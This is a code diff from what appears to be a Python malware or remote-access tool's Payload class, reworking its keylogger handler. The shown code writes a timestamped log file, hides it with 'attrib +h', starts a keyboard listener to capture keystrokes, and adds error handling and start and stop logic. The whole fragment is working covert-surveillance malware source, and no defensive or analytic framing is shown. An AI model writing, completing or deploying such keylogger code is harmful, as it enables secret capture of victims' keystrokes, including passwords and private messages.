@@ -134,22 +134,25 @@ class Payload():
                     pass
             
         def run():
-            try:
+            if not os.path.exists(file):
                 with open(file, 'w') as f:
                     f.write(time.ctime(time.time()) + '\n')
                 os.system(f'attrib +h "{file}"')
-                listener = Listener(on_press=on_press)
-                listener.start()
-                return listener
-            except Exception as e:
-                log(f"Error: {e}", level='error')
+            else:
+                with open(file, 'a') as f:
+                    f.write('\n\n' + time.ctime(time.time()) + '\n')
+            listener = Listener(on_press=on_press)
+            listener.start()
+            return listener
                 
         if "run" in mode:
             if 'keylogger' not in self.handlers:
-                self.handlers['keylogger'] = run()
-                if self.handlers['keylogger'] != None:
+                try:
+                    self.handlers['keylogger'] = run()
                     return "Keylogger started"
-                else:
+                except Exception as e:
+                    self.stop('keylogger')
+                    log(f"Error: {e}", level='error')
                     return "Error starting keylogger"
             else:
                 return "Keylogger already running"
